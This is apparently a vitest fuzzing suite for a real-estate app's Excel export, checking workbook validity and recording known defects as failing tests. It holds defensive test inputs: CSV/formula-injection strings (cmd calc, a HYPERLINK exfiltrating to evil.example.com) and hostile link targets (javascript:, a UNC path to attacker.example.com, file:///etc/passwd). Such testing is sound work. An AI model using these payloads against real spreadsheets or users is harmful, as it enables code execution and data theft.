/**
 * Adversarial fuzzing of the Excel export (src/lib/excel/workbook.ts).
 *
 * Every produced buffer is verified three ways:
 *   1. reloaded through ExcelJS,
 *   2. the zip container is validated by python3's `zipfile` (CRC check),
 *   3. every part is checked for XML well-formedness, plus the Excel-documented
 *      per-cell 32,767-character limit.
 *
 * Tests named "DEFECT n" assert the behaviour the export SHOULD have and currently fail.
 * Everything else passes and documents behaviour that holds up.
 */
import { describe, it, expect } from 'vitest';
import ExcelJS from 'exceljs';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  buildWorkbook, type ExportListing, type ExportOpenHouse, type ExportPriceEvent,
} from '@/lib/excel/workbook';

const TMP = mkdtempSync(join(tmpdir(), 'xlsx-fuzz-'));

/** Excel hard limit on the number of characters a single cell may hold. */
const EXCEL_CELL_CHAR_LIMIT = 32_767;

function listing(over: Partial<ExportListing> = {}): ExportListing {
  return {
    addressLine1: '1420 Pine St', city: 'Boulder', state: 'CO', postalCode: '80302',
    status: 'ACTIVE', propertyType: 'SINGLE_FAMILY', listPrice: 875000, beds: 3,
    bathsTotal: 2, livingAreaSqft: 1840, lotSizeSqft: 7360, yearBuilt: 1972,
    hoaFeeMonthly: null, listingUrl: 'https://www.zillow.com/homedetails/1_zpid/',
    firstSeenAt: new Date('2026-08-01T00:00:00Z'), lastSeenAt: new Date('2026-08-15T00:00:00Z'),
    daysTracked: 14, priceChangePct: -5.7, isFavorite: false, userStatus: null,
    rating: null, notes: null, tags: [], nextOpenHouse: null, ...over,
  };
}

const META = {
  exportedAt: new Date('2026-08-15T12:00:00Z'), providerIds: ['zillow'],
  areaNames: ['Central Boulder'], filterSummary: 'price <= 1000000', listingCount: 1,
};

function build(over: {
  listings?: ExportListing[]; priceEvents?: ExportPriceEvent[]; openHouses?: ExportOpenHouse[];
} = {}): Promise<Buffer> {
  return buildWorkbook({
    listings: over.listings ?? [], priceEvents: over.priceEvents ?? [],
    openHouses: over.openHouses ?? [], meta: META,
  });
}

/** Runs python3 `zipfile` over the buffer: CRC check, XML well-formedness, cell-length audit. */
interface ZipReport {
  zipOk: boolean;
  badMember: string | null;
  invalidXml: string[];
  longestString: number;
  sheet1: string;
  sheet3: string;
  rels: string;
}

const PY = `
import sys, zipfile, re, json
import xml.etree.ElementTree as ET
z = zipfile.ZipFile(sys.argv[1])
bad = z.testzip()
invalid = []
for n in z.namelist():
    if n.endswith('.xml') or n.endswith('.rels'):
        try:
            ET.fromstring(z.read(n))
        except Exception as e:
            invalid.append(n + ': ' + str(e))
longest = 0
if 'xl/sharedStrings.xml' in z.namelist():
    ss = z.read('xl/sharedStrings.xml').decode('utf-8')
    vals = re.findall(r'<t[^>]*>(.*?)</t>', ss, re.S)
    longest = max((len(v) for v in vals), default=0)
def rd(n):
    try: return z.read(n).decode('utf-8')
    except KeyError: return ''
print(json.dumps({
  'zipOk': bad is None, 'badMember': bad, 'invalidXml': invalid, 'longestString': longest,
  'sheet1': rd('xl/worksheets/sheet1.xml'),
  'sheet3': rd('xl/worksheets/sheet3.xml'),
  'rels': rd('xl/worksheets/_rels/sheet1.xml.rels'),
}))
`;

let seq = 0;
function inspect(buf: Buffer): ZipReport {
  const path = join(TMP, `wb-${seq++}.xlsx`);
  writeFileSync(path, buf);
  const out = execFileSync('python3', ['-c', PY, path], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
  return JSON.parse(out) as ZipReport;
}

async function reload(buf: Buffer): Promise<ExcelJS.Workbook> {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buf as never);
  return wb;
}

/** The full three-way verification every case in this file runs. */
async function verify(buf: Buffer): Promise<{ wb: ExcelJS.Workbook; zip: ZipReport }> {
  expect(buf.subarray(0, 2).toString()).toBe('PK');
  const zip = inspect(buf);
  expect(zip.badMember).toBeNull();
  expect(zip.zipOk).toBe(true);
  expect(zip.invalidXml).toEqual([]);
  const wb = await reload(buf);
  expect(wb.worksheets.map((w) => w.name)).toEqual(['Listings', 'Price History', 'Open Houses', 'Meta']);
  return { wb, zip };
}

// ---------------------------------------------------------------------------
// Behaviour that holds up
// ---------------------------------------------------------------------------

describe('excel export — cases that hold up', () => {
  it('every optional field null still produces a valid workbook', async () => {
    const buf = await build({
      listings: [listing({
        listPrice: null, beds: null, bathsTotal: null, livingAreaSqft: null, lotSizeSqft: null,
        yearBuilt: null, hoaFeeMonthly: null, listingUrl: null, priceChangePct: null,
        userStatus: null, rating: null, notes: null, tags: [], nextOpenHouse: null,
      })],
    });
    const { wb } = await verify(buf);
    const ws = wb.getWorksheet('Listings')!;
    expect(ws.getRow(2).getCell(1).value).toBe('1420 Pine St');
    expect(ws.getRow(2).getCell(5).value).toBeNull();
  });

  it('an entirely empty export is still a valid workbook', async () => {
    await verify(await build());
  });

  it('formula-looking strings are stored as shared STRINGS, never as <f> formulas', async () => {
    const payloads = [
      "=cmd|'/c calc'!A1",
      '=HYPERLINK("http://evil.example.com?x="&A1,"click")',
      '+1+1',
      '-2+3',
      '@SUM(1+1)*cmd|\'/c calc\'!A1',
      '=1+1',
    ];
    const buf = await build({
      listings: payloads.map((p) => listing({
        addressLine1: p, city: p, notes: p, tags: [p], userStatus: p, listingUrl: null,
      })),
    });
    const { wb, zip } = await verify(buf);
    // No formula element anywhere in the sheet.
    expect(zip.sheet1).not.toMatch(/<f[ >]/);
    // Every payload cell is t="s" (shared string), which Excel renders literally.
    expect(zip.sheet1).toMatch(/<c r="A2"[^>]*t="s">/);
    const ws = wb.getWorksheet('Listings')!;
    for (let i = 0; i < payloads.length; i++) {
      const cell = ws.getRow(i + 2).getCell(1);
      expect(typeof cell.value).toBe('string');
      expect(cell.value).toBe(payloads[i]);
      expect((cell as unknown as { formula?: string }).formula).toBeUndefined();
    }
  });

  it('control characters are stripped rather than written as invalid XML', async () => {
    const buf = await build({
      listings: [listing({ notes: 'a\u0000b\u0001c\u000Bd\u001Fe\u0008f' })],
    });
    const { wb, zip } = await verify(buf);
    expect(/[\u0000-\u0008\u000B\u000C\u000E-\u001F]/.test(zip.sheet1)).toBe(false);
    expect(wb.getWorksheet('Listings')!.getRow(2).getCell(21).value).toBe('abcdef');
  });

  it('emoji, RTL marks, newlines and tabs round-trip intact', async () => {
    const notes = '\u{1F3E1} keys ‮ RTL-override ‬\ttabbed\nsecond line العربية';
    const buf = await build({ listings: [listing({ notes, tags: ['\u{1F525}hot', 'עברית'] })] });
    const { wb } = await verify(buf);
    expect(wb.getWorksheet('Listings')!.getRow(2).getCell(21).value).toBe(notes);
  });

  it('lone surrogates do not corrupt the package', async () => {
    const buf = await build({ listings: [listing({ notes: 'bad\uD800half\uDFFF' })] });
    await verify(buf);
  });

  it('zero, negative and non-integer prices stay real numbers', async () => {
    const buf = await build({
      listings: [
        listing({ listPrice: 0 }),
        listing({ listPrice: -1 }),
        listing({ listPrice: 875000.7777 }),
        listing({ listPrice: Number.MAX_SAFE_INTEGER }),
      ],
    });
    const { wb } = await verify(buf);
    const ws = wb.getWorksheet('Listings')!;
    expect(ws.getRow(2).getCell(5).value).toBe(0);
    expect(ws.getRow(3).getCell(5).value).toBe(-1);
    expect(ws.getRow(4).getCell(5).value).toBe(875000.7777);
    expect(ws.getRow(5).getCell(5).value).toBe(Number.MAX_SAFE_INTEGER);
  });

  it('far-future dates (year 9999) stay inside the Excel serial range', async () => {
    const buf = await build({ listings: [listing({ firstSeenAt: new Date('9999-12-31T00:00:00Z') })] });
    const { zip } = await verify(buf);
    const serial = Number(/<c r="V2"[^>]*><v>([-\d.]+)<\/v>/.exec(zip.sheet1)?.[1]);
    expect(serial).toBeGreaterThan(0);
    expect(serial).toBeLessThanOrEqual(2958465.9999); // Excel's max date, 9999-12-31
  });

  it('3000 rows with duplicate addresses build and reload cleanly', async () => {
    const many: ExportListing[] = [];
    for (let i = 0; i < 3000; i++) {
      many.push(listing({
        addressLine1: '1420 Pine St', // deliberately identical for every row
        listingUrl: `https://www.zillow.com/homedetails/${i}_zpid/`,
        isFavorite: i % 7 === 0,
        notes: i % 11 === 0 ? 'note\nwith newline\tand tab \u{1F600}' : null,
        tags: ['watch', 'school-district'],
        nextOpenHouse: new Date(Date.UTC(2026, 7, 16, 19)),
      }));
    }
    const buf = await build({ listings: many });
    const { wb } = await verify(buf);
    expect(wb.getWorksheet('Listings')!.rowCount).toBe(3001);
  }, 120000);

  it('a URL with quotes, angle brackets, ampersands and spaces is XML-escaped', async () => {
    const buf = await build({ listings: [listing({ listingUrl: 'https://x.example.com/a "b" <c>&d e' })] });
    const { wb, zip } = await verify(buf);
    // Targets are now normalised through the URL parser, so hostile characters arrive
    // percent-encoded rather than raw-and-XML-escaped. Both are safe; encoded is stricter.
    expect(zip.rels).toContain('%22b%22');
    expect(zip.rels).not.toMatch(/Target="[^"]*[<>]/);
    expect(zip.rels).toContain('%3Cc%3E&amp;d');
    const v = wb.getWorksheet('Listings')!.getRow(2).getCell(1).value as { hyperlink: string };
    // Normalised, not verbatim: same destination, no raw quotes or angle brackets.
    expect(v.hyperlink).toBe('https://x.example.com/a%20%22b%22%20%3Cc%3E&d%20e');
    expect(v.hyperlink).not.toMatch(/["<>]/);
  });
});

// ---------------------------------------------------------------------------
// DEFECTS
// ---------------------------------------------------------------------------

describe('excel export — DEFECTS', () => {
  it('DEFECT 1: strings longer than Excel\'s 32,767-char cell limit are written verbatim', async () => {
    // addressLine1 comes straight from the remote provider and is clamped nowhere:
    // not in parse.ts, not in the ingest pipeline, not in the Prisma schema (TEXT),
    // and not here. Excel refuses to open the resulting file without "repairing" it.
    const buf = await build({ listings: [listing({ addressLine1: 'A'.repeat(40_000), listingUrl: null })] });
    const { zip } = await verify(buf);
    expect(zip.longestString).toBeLessThanOrEqual(EXCEL_CELL_CHAR_LIMIT);
  });

  it('DEFECT 2: NaN / Infinity are emitted as <v>NaN</v> and <v>Infinity</v> in numeric cells', async () => {
    // buildWorkbook declares these fields as `number | null`; NaN and Infinity are legal
    // `number`s. ExcelJS writes the JS stringification straight into the numeric <v>,
    // which is not a valid xsd:double literal. The zip and the XML stay well-formed, so
    // an ExcelJS round-trip silently reads them back as null and hides the damage —
    // but Excel itself rejects the sheet and offers to repair the workbook.
    const buf = await build({
      listings: [listing({ listPrice: NaN, priceChangePct: Infinity, beds: -Infinity })],
    });
    const { zip } = await verify(buf);
    expect(zip.sheet1).not.toMatch(/<v>-?(NaN|Infinity)<\/v>/);
  });

  it('DEFECT 2b: an Invalid Date is written as <v>NaN</v> in a date-formatted cell', async () => {
    // Same root cause as DEFECT 2, reached through a Date instead of a number:
    // ExcelJS converts the Date to a serial and writes NaN, and the reloaded cell comes
    // back as an Invalid Date rather than a blank.
    const buf = await build({ listings: [listing({ firstSeenAt: new Date('not a date') })] });
    const { wb, zip } = await verify(buf);
    expect(zip.sheet1).not.toMatch(/<v>NaN<\/v>/);
    expect(wb.getWorksheet('Listings')!.getRow(2).getCell(22).value).toBeNull();
  });

  it('DEFECT 3: pre-1900 dates become NEGATIVE Excel serials', async () => {
    // Reachable from remote data: parseOpenHouses accepts a negative epoch and the
    // resulting Date lands in the "Next Open House" / Open Houses columns.
    // Excel cannot represent a date before 1900-01-01; a date-formatted cell holding a
    // negative serial renders as ######## and is not a date at all.
    const buf = await build({
      listings: [listing({ nextOpenHouse: new Date('1779-11-13T13:20:00Z') })],
      openHouses: [{
        addressLine1: '1420 Pine St', city: 'Boulder', listPrice: 875000,
        startsAt: new Date('1779-11-13T13:20:00Z'), endsAt: new Date('1779-11-25T03:06:40Z'),
        appointmentOnly: false, virtual: false, isFavorite: false,
      }],
    });
    const { zip } = await verify(buf);
    const serials = [...zip.sheet3.matchAll(/<v>(-?[\d.]+)<\/v>/g)].map((m) => Number(m[1]));
    expect(serials.every((n) => n >= 0)).toBe(true);
  });

  it('DEFECT 4: hyperlink targets are written unvalidated, including javascript: and UNC paths', async () => {
    // listingUrl is derived from the remote `detailUrl` with no scheme check, then handed
    // to ExcelJS as a hyperlink Target with TargetMode="External".
    const hostile = [
      'javascript:alert(1)',
      '\\\\attacker.example.com\\share\\payload.exe',
      'file:///etc/passwd',
      'not a url at all',
    ];
    for (const url of hostile) {
      const buf = await build({ listings: [listing({ listingUrl: url })] });
      const { zip } = await verify(buf);
      const target = /Target="([^"]*)"/.exec(zip.rels)?.[1] ?? '';
      expect(
        target === '' || target.startsWith('https://') || target.startsWith('http://'),
        `hostile target survived into the workbook: ${target}`,
      ).toBe(true);
    }
  });

  it('DEFECT 5: auto-width measures "[object Object]" for the hyperlinked Address column', async () => {
    // addressLine1 is `{ text, hyperlink }` when a URL exists, and computeWidth does
    // String(v) on it. Every hyperlinked export gets the same 19-char Address column no
    // matter how long the addresses are.
    const longAddr = '12345 Extremely Long Street Name Boulevard Apartment 400';
    const withLink = await reload(await build({ listings: [listing({ addressLine1: longAddr })] }));
    const noLink = await reload(await build({
      listings: [listing({ addressLine1: longAddr, listingUrl: null })],
    }));
    expect(withLink.getWorksheet('Listings')!.getColumn(1).width)
      .toBe(noLink.getWorksheet('Listings')!.getColumn(1).width);
  });

  it('DEFECT 6: hyperlink styling is wrong in both directions', async () => {
    // (a) a favourite row's bold font wipes the blue/underline hyperlink styling;
    // (b) an address with NO hyperlink is still painted blue and underlined.
    const fav = await reload(await build({ listings: [listing({ isFavorite: true })] }));
    const favFont = fav.getWorksheet('Listings')!.getRow(2).getCell(1).font ?? {};
    expect(favFont.underline, 'favourite rows lose their hyperlink styling').toBeTruthy();

    const plain = await reload(await build({ listings: [listing({ listingUrl: null })] }));
    const plainFont = plain.getWorksheet('Listings')!.getRow(2).getCell(1).font ?? {};
    expect(plainFont.underline, 'non-hyperlink address is styled as a link').toBeFalsy();
  });

  it('DEFECT 7: a null tags array or status crashes the whole export', async () => {
    // Neither is reachable through the current route, but a single bad row aborts the
    // entire download rather than degrading that one cell.
    await expect(build({ listings: [listing({ tags: null as never })] })).resolves.toBeDefined();
    await expect(build({ listings: [listing({ status: null as never })] })).resolves.toBeDefined();
  });
});
